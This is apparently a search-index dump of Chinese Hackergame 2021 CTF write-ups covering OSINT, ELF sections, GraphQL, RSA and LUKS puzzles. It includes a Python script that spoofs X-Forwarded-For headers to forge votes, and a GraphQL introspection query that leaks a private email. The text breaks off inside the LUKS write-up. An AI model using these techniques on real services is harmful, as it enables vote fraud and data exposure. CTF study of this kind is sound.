\u6839\u636e\u9009\u9879\u91cc\u7684\u65f6\u95f4\uff0c\u4e0b\u5348\u662f\u4e24\u70b9\u534a\u5de6\u53f3\uff0c\u800c\u5728\u4e1c\u5317\u7684\u4e24\u70b9\u534a\u5de6\u53f3\u5176\u5b9e\u548c\u4e2d\u5348\u5dee\u4e0d\u591a\uff0c\u5f71\u5b50\u548c\u5149\u6e29\u4e5f\u4e0d\u592a\u50cf\u8fd9\u4e2a\u6837\u5b50\uff0c\u6240\u4ee5\u53ef\u4ee5\u786e\u5b9a\u65f6\u95f4\u5927\u81f4\u662f \u508d\u665a \u8be5\u7167\u7247\u7684\u62cd\u6444\u8005\u6240\u5728\u697c\u5c42\u4e3a\uff1a \u4e0d\u597d\u786e\u5b9a\uff0c\u4f46\u662f\u7b54\u6848\u53ef\u4ee5\u4ea4\u5f88\u591a\u6b21\uff0c\u6240\u4ee5\u4ece9\u5c42\u5de6\u53f3\u4f9d\u6b21\u8bd5\u5c31\u53ef\u4ee5\u4e86\uff0c\u6700\u540e\u5f97\u5230\u697c\u5c42\u662f 14 \u8be5\u7167\u7247\u5de6\u4e0a\u89d2 KFC \u5206\u5e97\u7684\u7535\u8bdd\u53f7\u7801\u662f\uff1a \u76f4\u63a5\u7528\u5730\u56fe\u8f6f\u4ef6\u641c \u201c\u79e6\u7687\u5c9b\u65b0\u6fb3 KFC\u201d \u5c31\u53ef\u4ee5\u67e5\u5230\u90a3\u5bb6\u5e97\u94fa\uff0c\u4e5f\u7ed9\u4e86\u7535\u8bdd\uff0c\u6216\u8005\u641c\u7d22 \u201d\u7f51\u7ea2 \u6d77\u8fb9 KFC\u201c \u4e5f\u53ef\u4ee5\u76f4\u63a5\u5f97\u5230\u7535\u8bdd\uff1a 0335-7168800 \u8be5\u7167\u7247\u5de6\u4e0a\u89d2 KFC \u5206\u5e97\u5de6\u4fa7\u5efa\u7b51\u6709\u4e09\u4e2a\u6c34\u5e73\u6392\u5217\u7684\u6c49\u5b57\uff0c\u5b83\u4eec\u662f\uff1a \u901a\u8fc7\u8857\u666f\u5730\u56fe\u5c31\u53ef\u4ee5\u770b\u5230 KFC \u5de6\u8fb9\u7684\u5efa\u7b51\u4e0a\u5199\u4e86 \u6d77\u8c5a\u9986","title":"\u65c5\u884c\u7167\u7247"},{"location":"writeups/hackergame2021/#flag","text":"\u53c2\u4e0e\u6d3b\u52a8\uff0c\u52a9\u529b\u62bd\u5956\uff01\u96c6\u6ee1 1 \u4e2a flag\uff0c\u5373\u53ef\u63d0\u53d6 1 \u4e2a flag\u3002 \u606d\u559c\u4f60\u79ef\u6512\u5230 0.5\u2026\u2026 \u4e2a flag\uff0c \u5269\u4f59\u65f6\u95f4\uff1a10\u520600\u79d2 \u5df2\u6709 0 \u4f4d\u597d\u53cb\u4e3a\u60a8\u52a9\u529b\u3002 \u5c06\u5982\u4e0b\u94fe\u63a5\u5206\u4eab\u7ed9\u597d\u53cb\uff0c\u53ef\u4ee5\u83b7\u5f97\u597d\u53cb\u52a9\u529b\uff0c\u83b7\u5f97\u66f4\u591a flag\uff1a\u2026\u2026 \u8001\u5e76\u5915\u5915\u4e86 \uff0c\u7ecf\u8fc7\u4e00\u4e9b\u6d4b\u8bd5\u548c\u770b\u89c4\u5219\u53ef\u4ee5\u77e5\u9053\uff0cip \u5728\u540c\u4e00 /8 \u7f51\u6bb5\u7684\u7528\u6237\u88ab\u89c6\u4e3a\u540c\u4e00\u7528\u6237\uff0c\u5373 ip \u5730\u5740\u7684\u7b2c\u4e00\u4e2a\u70b9\u524d\u9762\u7684\u6570\u5b57\u4e0d\u4e00\u6837\u624d\u662f\u4e0d\u540c\u7528\u6237 \u518d\u7528\u865a\u62df\u673a\u548c\u624b\u673a\u8bd5\u4e00\u4e0b\uff0c\u53d1\u73b0\u6bcf\u4e2a\u7528\u6237\u589e\u52a0\u7684 flag \u6570\u91cf\u5f88\u5c0f \u6240\u4ee5\u63a8\u6d4b\u9700\u8981200+\u4e2a ip \u5730\u5740\uff0c\u80af\u5b9a\u4e0d\u4f1a\u8981\u771f\u7684\u8f6c\u53d1\uff0c\u800c\u4e14\u4e5f\u5f88\u96be\u51d1\u51fa\u5f88\u591a\u4e0d\u5728\u540c\u4e00 /8 \u7f51\u6bb5\u7684 ip \u4e8e\u662f\u5728 BurpSuite \u91cc\u9762\u6293\u5305\u53ef\u4ee5\u770b\u5230\uff0c\u6bcf\u6b21\u70b9\u51fb\u201c\u52a9\u529b\u201d\u90fd\u4f1a\u53d1\u9001\u4e00\u4e2a\u5230\u52a9\u529b\u94fe\u63a5\u7684 POST\uff0c\u5185\u5bb9\u4e3a ip \u5730\u5740 \u7136\u540e\u5c06\u5176\u53d1\u9001\u5230 Repeater \u4e2d\uff0c\u5c1d\u8bd5\u66f4\u6539 ip \u5730\u5740\uff0c\u5f97\u5230\u7684 Response \u4e2d\u8bf4 \u201c\u5931\u8d25\uff01\u68c0\u6d4b\u5230\u524d\u540e\u7aef\u68c0\u6d4b IPv4 \u5730\u5740\u4e0d\u5339\u914d\u201d \u6240\u4ee5\u4ec5\u4ec5\u66f4\u6539 POST \u5185\u5bb9\u7684 ip \u662f\u4e0d\u591f\u7684\uff0c\u800c\u63d0\u4f9b\u7ed9\u68c0\u6d4b\u7684\u5185\u5bb9\u4e5f\u4ec5\u4ec5\u662f\u4e00\u4e2a POST\uff0c\u6240\u4ee5\u53ef\u4ee5\u66f4\u6539 POST \u5934\uff0c\u6dfb\u52a0 X-Forwarded-For \u7136\u540e\u4f7f\u7528 python \u5c31\u53ef\u4ee5\u5faa\u73af\u53d1\u9001 POST \u5e76\u4f2a\u9020 ip \u5730\u5740\u5f97\u5230256\u4e2a\u52a9\u529b\u4e86\uff0c\u521a\u597d\u8fbe\u52301\u4e2aflag\uff1a \uff08\u8981\u6ce8\u610f sleep \u4e00\u6bb5\u65f6\u95f4\uff0c\u4e0d\u7136\u4f1a\u51fa\u73b0\u64cd\u4f5c\u8fc7\u5feb\u62d2\u7edd\u7684\u60c5\u51b5\uff1b\u4e5f\u4e0d\u8981 sleep \u8fc7\u957f\uff0c\u5426\u5219\u8d85\u8fc710\u5206\u949f flag \u5c31\u65e0\u6548\u4e86\uff09 import requests import time from tqdm import tqdm url = \"http://202.38.93.111:10888/invite/...\" with tqdm ( total = 256 ) as pbar : for i in range ( 256 ): res = requests . post ( url , data = { \"ip\" : f \" { i } .0.0.0\" }, headers = { \"X-Forwarded-For\" : f \" { i } .0.0.0\" }) if \"\u6210\u529f\" not in res . text : print ( \"[x] \u5931\u8d25\" ) print ( res . text ) time . sleep ( 1.5 ) pbar . update ( 1 )","title":"FLAG \u52a9\u529b\u5927\u7ea2\u5305"},{"location":"writeups/hackergame2021/#amnesia","text":"","title":"Amnesia"},{"location":"writeups/hackergame2021/#_7","text":"\u4f60\u7684\u7a0b\u5e8f\u53ea\u9700\u8981\u8f93\u51fa\u5b57\u7b26\u4e32 Hello, world!\uff08\u7ed3\u5c3e\u6709\u65e0\u6362\u884c\u5747\u53ef\uff09\u5e76\u6b63\u5e38\u7ed3\u675f\u3002 \u7f16\u8bd1\u6307\u4ee4\uff1a gcc -O file.c -m32 \u8fd0\u884c\u6307\u4ee4\uff1a ./a.out \u7f16\u8bd1\u540e ELF \u6587\u4ef6\u7684 .data \u548c .rodata \u6bb5\u4f1a\u88ab\u6e05\u96f6\u3002 ELF\uff08Executable and Linkable Format\uff09\u662f Linux \u4e0b\u5e38\u7528\u7684\u53ef\u6267\u884c\u6587\u4ef6\u683c\u5f0f\uff0c\u5176\u4e2d\u6709\u5f88\u591a\u4e0d\u540c\u7684\u8282\uff1a .text \u8282\uff1a\u7a0b\u5e8f\u8fd0\u884c\u9700\u8981\u7684\u4ee3\u7801 .data \u8282\uff1a\u5b58\u653e\u53ef\u4fee\u6539\u7684\u6570\u636e\uff0c\u4e00\u822c\u662f\u975e const \u5168\u5c40\u53d8\u91cf\u548c\u9759\u6001\u53d8\u91cf .rodata \u8282\uff1a\u5373 read only data\uff0c\u4e00\u822c\u662f\u5e38\u91cf\u6216\u8005\u5b57\u7b26\u4e32 .bss \u8282\uff1a\u6ca1\u6709\u88ab\u521d\u59cb\u5316\u7684\u53d8\u91cf \u2026\u2026 \u800c\u8fd9\u9053\u9898\u76ee\u5219\u662f\u5728\u7f16\u8bd1\u751f\u6210\u53ef\u6267\u884c\u6587\u4ef6 a.out \u540e\uff0c\u6e05\u7a7a .data \u548c .rodata \u9996\u5148\u4e0d\u59a8\u6b63\u5e38\u7f16\u5199\u4e00\u4e2a\u8f93\u51fa \u201cHello, world!\u201d \u7684\u7a0b\u5e8f\uff1a printf ( \"Hello, world! \\n \" ); \u7136\u540e\u7f16\u8bd1\uff0c\u518d\u62d6\u5230 IDA \u91cc \u53ef\u4ee5\u53d1\u73b0\uff0c\u6b64\u65f6\u7684 \"Hello, world!\" \u88ab\u653e\u5230\u4e86 .rodata \u8282\u4e2d\uff0c\u4f1a\u88ab\u6e05\u9664\u6389\uff0c\u6240\u4ee5\u8fd9\u6837\u5199\u4e0d\u884c \u76f4\u63a5\u4f7f\u7528\u5b57\u7b26\u4e32\u4f1a\u88ab\u653e\u5230 .rodata \u4e2d\u6e05\u9664\uff0c\u5199\u6210\u5168\u5c40\u53d8\u91cf\u53c8\u4f1a\u653e\u5230 .data \u4e2d \u4f46\u662f\uff0c\u5982\u679c\u5199\u6210\u5c40\u90e8\u53d8\u91cf\u5462\uff1a char str [] = \"Hello, world! \\n \" ; printf ( str ); \u7f16\u8bd1\uff0c\u62d6\u5230 IDA \u91cc \u53ef\u4ee5\u770b\u51fa\uff0c\u8fd9\u6b21\u7684\u5b57\u7b26\u4e32\u76f4\u63a5\u5199\u5230\u4e86 .text \u8282\u4e2d\uff0c\u5220\u6389\u4e86 .data .rodata \u4e5f\u6ca1\u6709\u5f71\u54cd \u6240\u4ee5\u628a\u8fd9\u4e2a\u4ee3\u7801\u4ea4\u4e0a\u53bb\u5c31\u53ef\u4ee5\u8f93\u51fa \u201cHello, world!\u201c \u62ff\u5230 flag \u4e86 \u6e05\u9664\u8bb0\u5fc6\u76f4\u63a5\u628a .text \u8282\u5168\u5220\u6389\u4e86\uff0c\u60f3\u4e86\u5f88\u4e45\u4e5f\u4e0d\u77e5\u9053\u548b\u641e\uff0c\u867d\u7136\u53ef\u4ee5 __attribute__ ((section (\"...\"))) \u6765\u628a\u51fd\u6570\u6216\u53d8\u91cf\u585e\u5230\u6307\u5b9a\u7684\u8282\u4e2d\u3002\u4f46\u8fd8\u662f\u4e0d\u6e05\u695a\u8981\u600e\u4e48\u89e3\u51b3\u6bb5\u9519\u8bef\u7684\u95ee\u9898qwq","title":"\u8f7b\u5ea6\u5931\u5fc6"},{"location":"writeups/hackergame2021/#_8","text":"\u5c0f T \u542c\u8bf4 GraphQL \u662f\u4e00\u79cd\u7279\u522b\u7684 API \u8bbe\u8ba1\u6a21\u5f0f\uff0c\u4e5f\u662f RESTful API \u7684\u6709\u529b\u7ade\u4e89\u8005\uff0c\u6240\u4ee5\u4ed6\u5199\u4e86\u4e2a\u5c0f\u7f51\u7ad9\u6765\u5b9e\u9a8c\u8fd9\u9879\u6280\u672f\u3002 \u4f60\u80fd\u901a\u8fc7\u8fd9\u4e2a\u5168\u65b0\u7684\u63a5\u53e3\uff0c\u83b7\u53d6\u5230\u6ca1\u6709\u516c\u5f00\u51fa\u6765\u7684\u7ba1\u7406\u5458\u7684\u90ae\u7bb1\u5730\u5740\u5417\uff1f \u9898\u76ee\u4fe1\u606f\u7ed9\u7684\u5f88\u5145\u5206\uff0c\u7528\u7684\u662f GraphQL\uff0c\u8981\u7528\u5176\u5f97\u5230 admin \u7684\u90ae\u7bb1 \u6ca1\u63a5\u89e6\u8fc7 GraphQL\uff0c\u6240\u4ee5\u76f4\u63a5\u5fc5\u5e94\uff08\u9003 \u67e5\u5230\u4e86\u5f88\u591a\u6709\u7528\u7684\u4e1c\u897f\uff1a GraphQL\u5b98\u7f51 \uff1a\u4e86\u89e3\u4e00\u4e0b GraphQL \u662f\u5e72\u4ec0\u4e48\u7684\uff0c\u8981\u600e\u4e48\u7528 GraphiQL \uff1a\u4e00\u4e2a\u8fdb\u884c GraphQL \u67e5\u8be2\u7684 GUI \u3010\u5b89\u5168\u8bb0\u5f55\u3011\u73a9\u8f6cGraphQL - DVGA\u9776\u573a\uff08\u4e0a\uff09- \u77e5\u4e4e GraphQL Voyager \uff1a\u53ef\u89c6\u5316\u73b0\u5b9e GraphQL \u5185\u7701\u51fa\u7684\u7ed3\u6784 \u7b80\u800c\u8a00\u4e4b\uff0cGraphQL \u5c31\u662f\u4e00\u4e2a\u53ef\u4ee5\u901a\u8fc7\u4e00\u6b21 query \u8bf7\u6c42\u67e5\u8be2\u591a\u4e2a\u8d44\u6e90\u7684 API \u6a21\u5f0f\uff0c\u53ea\u8981 \u7f51\u5740/graphql?query=... \u5c31\u53ef\u4ee5\u5b9e\u73b0\u67e5\u8be2 \u6709\u4e9b\u4f7f\u7528 GraphQL \u7684\u7f51\u7ad9\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u8bbf\u95ee \u7f51\u5740/graphiql \u5f97\u5230\u67e5\u8be2\u7684 GUI \u4f46\u662f\u672c\u9898\u4e2d\u7981\u6b62\u4e86\uff0c\u4f46\u53ef\u4ee5\u4f7f\u7528 GraphiQL \u8f6f\u4ef6\u6765\u8fdb\u884c\u67e5\u8be2 \u5728\u7b2c\u4e09\u4e2a\u94fe\u63a5\u4e2d\u53ef\u4ee5\u4e86\u89e3\u5230\uff0c\u53ef\u4ee5\u5229\u7528 GraphQL \u7684\u5185\u7701\u67e5\u8be2\u6765\u6cc4\u9732\u51fa\u5185\u90e8\u7684\u7ed3\u6784\uff0c\u628a\u5176\u4e2d\u7684\u67e5\u8be2\u8bed\u53e5\u4e22\u5230 GraphiQL \u4e2d\u53ef\u4ee5\u5f97\u5230\u7ed3\u679c query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } }}fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef }}fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue}fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }} \u7136\u540e\u628a\u7ed3\u679c\u4e22\u5230 GraphQL Voyager \u4e2d\u5c31\u53ef\u4ee5\u5f97\u5230\u53ef\u89c6\u5316\u7684\u7ed3\u6784\uff1a \u6240\u4ee5\u53ea\u9700\u8981\u6839\u636e id query \u4e00\u4e0b user \u5c31\u53ef\u4ee5\u4e86\uff1a query { user ( id : 1 ) { privateEmail , } } >>> { \"data\" : { \"user\" : { \"privateEmail\" : \"flag{...}\" } } }","title":"\u56fe\u4e4b\u4e0a\u7684\u4fe1\u606f"},{"location":"writeups/hackergame2021/#easy-rsa","text":"\u81ea\u4ece Hackergame 2018 \u516c\u7136\u63ed\u9732\u4e86\u5927\u6574\u6570\u53ef\u4ee5\u88ab\u795e\u7ae5\u53e3\u7b97\u5206\u89e3\u7684\u4e8b\u5b9e\uff0cRSA \u5728 hackergame \u4e2d\u5df2\u7ecf\u53ea\u80fd\u5904\u4e8e\u4f4e\u5206\u503c\u7684\u5730\u4f4d\u4e86\u3002\u5982\u679c\u4e0d\u5728\u5176\u540d\u79f0\u524d\u9762\u52a0\u4e0a Easy \u8fd9\u4e2a\u5355\u8bcd\uff0c\u4f3c\u4e4e\u5c31\u4f1a\u663e\u5f97\u5b8c\u5168\u5bf9\u4e0d\u8d77\u5176\u4ed6\u9898\u76ee\u3002 \u66f4\u4f55\u51b5\uff0c\u5728\u672c\u9898\u7684\u9644\u4ef6\u4e2d\uff0c\u4f60\u8fd8\u83b7\u5f97\u4e86\u6784\u9020 p \u548c q \u7684\u65b9\u5f0f\u3002\u6570\u7406\u57fa\u7840\u624e\u5b9e\u7684\u4f60\u5e94\u8be5\u53ef\u4ee5\u8f7b\u677e\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u5427\u3002 \u8c22\u9080\uff0c\u6ca1\u6709\u6570\u7406\u57fa\u7840 \u770b\u4ee3\u7801\uff01 e = 65537 def get_p (): x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451 y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439 value_p = sympy . nextprime (( math . factorial ( y )) % x ) # Hint\uff1a\u8fd9\u91cc\u76f4\u63a5\u8ba1\u7b97\u4f1a\u6ea2\u51fa\uff0c\u8bf7\u4f60\u4ed4\u7ec6\u89c2\u5bdf x \u548c y \u7684\u7279\u5f81 return value_p def get_q (): value = [ getPrime ( 256 )] for i in range ( 1 , 10 ): value . append ( sympy . nextprime ( value [ i - 1 ])) print ( \"value[-1] = \" , value [ - 1 ]) # value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967 n = 1 for i in range ( 10 ): n = n * value [ i ] q = getPrime ( 512 ) value_q = pow ( q , e , n ) print ( \"value_q = \" , value_q ) # value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819 return sympy . nextprime ( q ) # this destroyes the rsa cryptosystem p = get_p () q = get_q () m = int . from_bytes ( open ( \"flag.txt\" , \"rb\" ) . read (), \"big\" ) c = pow ( m , e , p * q ) print ( \"c = \" , c ) # c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478 \u53ef\u4ee5\u770b\u5230\uff0c\u5176\u4e2d\u8981\u89e3\u51b3\u7684\u5c31\u662f get_p() \u4e2d y! % x \u6ea2\u51fa\u7684\u95ee\u9898\uff0c\u4ee5\u53ca get_q() \u4e2d q \u662f\u54ea\u4e2a\u968f\u673a\u7684512\u4f4d\u8d28\u6570\u7684\u95ee\u9898 get_p : \u4ee3\u7801\u91cc\u4e5f\u7ed9\u4e86 Hint\uff0c\u89c2\u5bdf x \u548c y \u7684\u7279\u5f81\u3002x \u548c y \u90fd\u5f88\u5927\uff0c\u4f46\u662f\u4e24\u4e2a\u7684\u5dee\u5e76\u4e0d\u5927\uff1b\u800c\u4e14\u53ef\u4ee5\u4e22\u5230 python \u91cc\u9a8c\u8bc1\u51fa x \u662f\u4e00\u4e2a\u8d28\u6570 \u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528 \u5a01\u5c14\u900a\u5b9a\u7406 \u4e5f\u67e5\u5230\u4e86\u5a01\u5c14\u900a\u5b9a\u7406\u5728 RSA \u9898\u76ee\u4e2d\u7684\u5e94\u7528\uff1a BUU-RSA [RoarCTF2019]babyRSA \u8981\u6c42 y! % x\uff08x\u662f\u8d28\u6570\uff09 \u6839\u636e\u5a01\u5c14\u900a\u5b9a\u7406\uff0c\u6709 \\[ (x - 1)! \\equiv -1\\pmod{x} \\] \u6240\u4ee5\uff1a \\[ y!\\times \\frac{(x - 1)!}{y!}\\equiv -1\\pmod{x} \\] \u4ee4 \\(k = \\dfrac{(x - 1)!}{y!} = (y+1)(y+2)...(x-1)x\\) \uff0c\u6240\u4ee5\u6709\uff1a \\[ y!\\equiv -\\mathrm{inv}(k, x)\\pmod{x} \\] \uff08\u5176\u4e2d \\(\\mathrm{inv}(k, x)\\) \u8868\u793a\u6a21 x \u4e0b k \u7684\u9006\u5143\uff09 \u6240\u4ee5\u91cd\u5199 get_p() \u5373\u53ef\u6b63\u786e\u7684\u5f97\u5230 p\uff1a def get_p (): x = ... y = ... k = 1 for i in range ( y + 1 , x ): k = ( k * i ) % x res = ( - gmpy2 . invert ( k , x )) % x return sympy . nextprime ( res ) get_q : \u76f8\u6bd4\u6765\u8bf4\uff0cget_q \u5c31\u6ca1\u90a3\u4e48\u9700\u8981\u6280\u5de7\u4e86 \u7ed9\u51fa\u4e86 value[-1] \u7684\u503c\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u7528 sympy.prevprime \u9006\u63a8\u51fa\u6574\u4e2a value \u6570\u7ec4 value = [ 80096058210213458444437404275177554701604739094679033012396452382975889905967 ] for i in range ( 1 , 10 ): value . append ( sympy . prevprime ( value [ i - 1 ])) print ( \"value[-1] = \" , value [ - 1 ]) \u540e\u9762\u8ba1\u7b97 value_q \u7ec6\u770b\u5176\u5b9e\u4e5f\u662f\u4e00\u4e2a RSA \u7b97\u6cd5\uff1a q\uff1a\u5bc6\u6587 e\uff1a\u79c1\u94a5 value_q\uff1a\u660e\u6587 n\uff1a\u5c31\u662f n\uff0c\u53ea\u4e0d\u8fc7\u4e0d\u662f\u4e24\u4e2a\u8d28\u6570\u76f8\u4e58\uff0c\u662f\u5341\u4e2a\u8d28\u6570\u76f8\u4e58 \u5341\u4e2a\u8d28\u6570\u76f8\u4e58\u5f97\u5230 n \u7684 RSA \u7b97\u6cd5\u4e5f\u4e00\u6837\uff0c\u56e0\u4e3a RSA \u7684\u6b63\u786e\u6027\u5e76\u6ca1\u6709\u8981\u6c42 n \u4e00\u5b9a\u662f\u4e24\u4e2a\u5927\u8d28\u6570\u76f8\u4e58\uff0c\u8fd9\u6837\u53ea\u662f\u96be\u4ee5\u7834\u89e3\u4fdd\u8bc1\u5b89\u5168\u6027 \u89e3\u51b3\u8fd9\u4e2a\u540c\u6837\u4e5f\u662f\u9700\u8981\u516c\u94a5 d\uff0c\u6240\u4ee5\u9700\u8981 phi(n) \u6839\u636e \u6b27\u62c9\u51fd\u6570 \u7684\u6027\u8d28\uff0cphi(n) \u7b49\u4e8e n \u7684\u6240\u6709\u8d28\u56e0\u6570\u51cf\u4e00\u7684\u79ef \u5373 phi(n) = (value[0] - 1) * (value[1] - 1) * ... * (value[9] - 1) \u518d\u89e3\u5bc6\u5373\u53ef\u5f97\u5230\u5bc6\u6587 q\uff0c\u7136\u540e\u4e5f\u5c31\u5f97\u5230\u4e86 get_q \u7684\u7ed3\u679c n = phi = 1 for i in range ( 10 ): n = n * value [ i ] phi *= ( value [ i ] - 1 ) value_q = ... d = pow ( e , - 1 , phi ) q = pow ( value_q , d , n ) return sympy . nextprime ( q ) flag : \u641e\u5b9a\u4e86 get_p \u548c get_q \u4e4b\u540e\u5c31\u53ef\u4ee5\u76f4\u63a5\u89e3\u51fa flag \u4e86\uff1a e = 65537 p = get_p () q = get_q () c = ... d = pow ( e , - 1 , ( p - 1 ) * ( q - 1 )) m = pow ( c , d , p * q ) print ( int . to_bytes ( m , 30 , byteorder = \"big\" ))","title":"Easy RSA"},{"location":"writeups/hackergame2021/#u","text":"\uff08\u672c\u6765\u633a\u597d\u505a\u7684\u4e00\u9053\u9898\uff0c\u600e\u4e48\u9898\u7ed9\u7684\u63d0\u793a\u6211\u5c31\u786c\u662f\u6ca1\u9886\u4f1a\u5230\uff09 \u8fd9\u662f\u4e00\u4e2a\u5173\u4e8e LUKS (Linux Unified Key Setup) \u7684\u6545\u4e8b\u3002 \u7b2c\u4e00\u5929 \u5c0f T\uff1a\u300c\u4f60\u8981\u7684\u968f\u673a\u8fc7\u7a0b\u7684\u8bfe\u4ef6\u6211\u5e2e\u4f60\u62f7\u597d\u4e86\uff0c\u5728\u8fd9\u4e2a U \u76d8\u91cc\uff0cLUKS \u52a0\u5bc6\u7684\u5bc6\u7801\u662f suijiguocheng123123\u3002\u300d \u5c0f Z\uff1a\u300c\u554a\uff0c\u4f60\u53c8\u641e\u4e86 Linux \u6587\u4ef6\u7cfb\u7edf\u52a0\u5bc6\uff0c\u771f\u62ff\u4f60\u6ca1\u529e\u6cd5\u3002\u6211\u73b0\u5728\u4e0d\u65b9\u4fbf\u7528 Linux\uff0c\u6211\u76f4\u63a5\u628a\u8fd9\u5757\u76d8\u505a\u6210\u78c1\u76d8\u955c\u50cf\u6587\u4ef6\u518d\u56de\u53bb\u5904\u7406\u5427\u3002\u300d \u7b2c\u4e8c\u5929 \u5c0f Z\uff1a\u300c\u8c22\u8c22\u4f60\u6628\u5929\u5e2e\u6211\u62f7\u7684\u8bfe\u4ef6\u3002\u4f60\u6bcf\u6b21\u90fd\u641e\u8fd9\u4e2a\u52a0\u5bc6\uff0c\u5b83\u771f\u7684\u5b89\u5168\u5417\uff1f\u300d \u5c0f T\uff1a\u300c\u5f53\u7136\u4e86\uff01\u4f60\u770b\uff0c\u4f60\u8fd8\u7ed9\u6211\u4e4b\u540e\uff0c\u6211\u5df2\u7ecf\u628a\u8fd9\u5757\u76d8\u7684\u5f31\u5bc6\u7801\u6539\u6389\u4e86\uff0c\u73b0\u5728\u662f\u968f\u673a\u751f\u6210\u7684\u5f3a\u5bc6\u7801\uff0c\u8fd9\u6837\u9664\u4e86\u6211\u81ea\u5df1\uff0c\u4e16\u754c\u4e0a\u4efb\u4f55\u4eba\u90fd\u65e0\u6cd5\u89e3\u5bc6\u5b83\u4e86\u3002\u300d \u5c0f Z\uff1a\u300c\u6211\u53ef\u4e0d\u4fe1\u3002\u300d \u5c0f T\uff1a\u300c\u4f60\u4e0d\u4fe1\uff1f\u4f60\u770b\uff0c\u6211\u73b0\u5728\u5f80 U \u76d8\u91cc\u653e\u4e00\u4e2a flag \u6587\u4ef6\uff0c\u7136\u540e\u8fd9\u4e2a U \u76d8\u5c31\u7ed9\u4f60\u4e86\uff0c\u4f60\u7edd\u5bf9\u89e3\u5bc6\u4e0d\u51fa\u6765\u8fd9\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u3002\u5f53\u521d\u641e LUKS \u7684\u65f6\u5019\u6211\u53ef\u7814\u7a76\u4e86\u597d\u51e0\u5929\uff0c\u73ed\u4e0a\u53ef\u6ca1\u4eba\u6bd4\u6211\u66f4\u61c2\u52a0\u5bc6\uff01\u300d \u4e00\u5171\u7ed9\u4e86\u4e24\u4e2a img \u6587\u4ef6\uff0c\u901a\u8fc7 file \u53ef\u4ee5\u770b\u51fa\u90fd\u662f DOS/MBR boot sector $ file *.img day1.img: DOS/MBR boot sector ; partition 1 : ID = 0xee, start-CHS ( 0x0,0,2 ) , end-CHS ( 0x3ff,255,63 ) , startsector 1 , 40959 sectors, extended partition table ( last ) day2.img: DOS/MBR boot sector ; partition 1 : ID = 0xee, start-CHS ( 0x0,0,2 ) , end-CHS ( 0x3ff,255,63 ) , startsector 1 , 40959 sectors, extended partition table ( last ) \u6240\u4ee5\u5148\u76f4\u63a5 7z \u63d0\u53d6\uff0c\u5f97\u5230\u4e24\u4e2a\u65b0\u7684 img\uff0c\u518d file\uff1a $ file *.img My Disk.img: LUKS encrypted file, ver 2 [ , , sha256 ] UUID: e9a660d5-4a91-4dca-bda5-3f6a49eea998 My Disk 2 .img: LUKS encrypted file, ver 2 [ , , sha256 ] UUID: e9a660d5-4a91-4dca-bda5-3f6a49eea998 \u53d1\u73b0\u90fd\u662f LUKS encrypted file \u5728 Kali Linux \u91cc\u5c1d\u8bd5\u76f4\u63a5\u6302\u8f7d\u7b2c\u4e00\u4e2a img\uff0c\u8981\u6c42\u8f93\u5165\u5bc6\u7801\uff0c\u628a\u9898\u7ed9\u7684\u5bc6\u7801\u8f93\u5165\u5c31\u53ef\u4ee5\u770b\u5230 \u201c\u8bfe\u4ef6\u201d \u4ee5\u4e0a\u90fd\u662f\u5df2\u77e5\u7684\u8bd5\u9a8c\u90e8\u5206\uff0c\u771f\u6b63\u8981\u505a\u7684\u662f\u89e3\u5f00\u7b2c\u4e8c\u4e2a\u672a\u77e5\u5bc6\u7801\u7684 LUKS img \u5df2\u77e5\u78c1\u76d8\u7684\u52a0\u5bc6\u4f7f\u7528\u7684\u662f luks2\uff0c\u5728\u7f51\u4e0a\u67e5\u4e86\u7834\u89e3 luks2 \u4e4b\u7c7b\u7684\u90fd\u8bf4 luks2 \u4e0d\u53ef\u7834\u89e3 \uff0c\u6216\u8005\u662f\u4f7f\u7528\u5df2\u77e5\u7684\u5bc6\u7801\u5b57\u5178\u6765\u7206\u7834 \u4f46\u662f\u9898\u91cc\u8bf4\u4e86 \u201c \u968f\u673a\u751f\u6210 \u7684\u5f3a\u5bc6\u7801\u201d\uff0c\u6240\u4ee5\u4e5f\u662f\u6ca1\u6709\u5bc6\u7801\u5b57\u5178\u7684 \u5176\u5b9e\u8fd9\u9053\u9898\u7684\u6700\u5927\u63d0\u793a\u5c31\u5728\u4e8e\u5b83\u7ed9\u4e86\u4e24\u4e2a img\uff0c\u65e2\u7136\u7b2c\u4e00\u4e2a img \u6253\u5f00\u540e\u4ec5\u4ec5\u662f\u4e00\u4e2a\u8bfe\u4ef6\uff0c\u5982\u679c\u5b83\u7684\u7528\u5904\u4ec5\u4ec5\u662f\u7528\u6765\u8bd5\u9a8c luks \u600e\u4e48\u6253\u5f00\u7684\u8bdd\uff0c\u6839\u672c\u5b83\u6ca1\u5fc5\u8981\u7ed9\u51fa \u6240\u4ee5\u7b2c\u4e00\u4e2a img \u80af\u5b9a\u8fd8\u662f\u6709\u7528\u7684\u3002 